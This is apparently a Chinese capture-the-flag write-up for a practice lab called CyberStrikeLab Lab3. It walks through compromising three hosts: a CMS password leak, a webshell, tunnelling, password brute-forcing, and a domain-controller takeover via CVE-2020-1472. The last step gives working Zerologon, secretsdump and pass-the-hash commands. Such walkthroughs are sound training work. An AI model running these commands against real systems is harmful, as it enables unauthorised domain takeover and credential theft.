# CyberStrikeLab-Lab3靶场-先知社区

> **来源**: https://xz.aliyun.com/news/17006  
> **文章ID**: 17006

---

# Lab3

## 192.168.10.10/192.168.20.10

**taoCMS前端泄露密码**

![](images/20250305170305-a665a42e-f9a0-1.png)

**新建文件写入木马**

![](images/20250305170306-a72fa63f-f9a0-1.png)

**蚁剑成功连接**

![](images/20250305170307-a7ad7aac-f9a0-1.png)

**添加rdp用户，开发3389端口并连接**

flag1: go-flag{IpbKNIOigmnsuwY3}

![](images/20250305170308-a8147caa-f9a0-1.png)

## 192.168.20.20

**传fscan做内网信息收集**

![](images/20250305170309-a892c5ad-f9a0-1.png)

**stowaway建socks隧道**

![](images/20250305170309-a90ceef6-f9a0-1.png)

**ThinkPHP站点**

![](images/20250305170310-a978dd18-f9a0-1.png)

**靶场提示**

![](images/20250305170311-a9f15cfa-f9a0-1.png)

**用****awBruter.py****爆破密码**

![](images/20250305170312-aa5e7a4e-f9a0-1.png)

**蚁剑成功连接**

![](images/20250305170312-aac5e03b-f9a0-1.png)

**创建rdp用户连接，域环境**

flag2:go-flag{C2AoW93mioh5XYQg}

![](images/20250305170313-ab2de3aa-f9a0-1.png)

**域控为192.168.20.30**

![](images/20250305170314-ab996396-f9a0-1.png)

## 192.168.20.30

**CVE-2020-1472域控提权，获取域控hash**

```
python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30
python secretsdump.py "cyberstrikelab.com/WIN-7NRTJO59O7N$@192.168.3.21" -no-pass
python wmiexec.py -hashes :f349636281150c001081894de72b4e2b cyberstrikelab.com/administrator@192.168.20.30
```

![](images/20250305170314-ac053df9-f9a0-1.png)

**hash传递连接192.168.20.30**

flag3:go-flag{ueoJt7eB6AQL8OpL}  
![image.png](images/22ded2dd-b04e-37b2-991e-f81f2589dd9a)
